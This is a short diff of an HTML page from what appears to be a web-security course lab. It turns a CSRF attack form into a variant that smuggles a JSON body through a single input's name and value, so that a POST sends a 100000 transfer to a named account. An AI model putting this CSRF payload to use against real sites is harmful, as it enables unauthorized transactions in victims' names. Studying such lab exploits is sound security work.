@@ -10,10 +10,12 @@
     <form
       id="attack-form" method="POST" action="https://cse543.websecurity.ngrok.pizza/backend/tfourtwo" >
       
-      <input type="hidden" name="amount" value="100000">
+      <!-- <input type="hidden" name="amount" value="100000">
       <input type="hidden" name="comment" value="CSRF Attack">
       <input type="hidden" name="fname" value="Surya">
-      <input type="hidden" name="username" value="skp6318">
+      <input type="hidden" name="username" value="skp6318"> -->
+
+      <input name='{"amount": "100000", "comment": "CSRF", "fname": "Surya", "username": "skp6318", "trash": "' value='"}'>
     </form>
 
     <script>
